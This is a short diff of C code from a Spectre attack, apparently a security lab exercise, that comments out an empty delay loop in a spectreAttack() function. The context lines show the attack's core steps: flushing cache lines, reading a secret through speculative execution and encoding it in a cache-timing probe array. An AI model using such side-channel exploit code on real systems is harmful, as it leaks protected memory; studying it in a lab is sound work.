@@ -72,9 +72,11 @@ void spectreAttack(size_t larger_x)
   {
     _mm_clflush(&array[i * 4096 + DELTA]);
   }
-  for (z = 0; z < 100; z++)
-  {
-  }
+
+  // for (z = 0; z < 100; z++)
+  // {
+  // }
+
   // Ask restrictedAccess() to return the secret in out-of-order execution.
   s = restrictedAccess(larger_x);
   array[s * 4096 + DELTA] += 88;
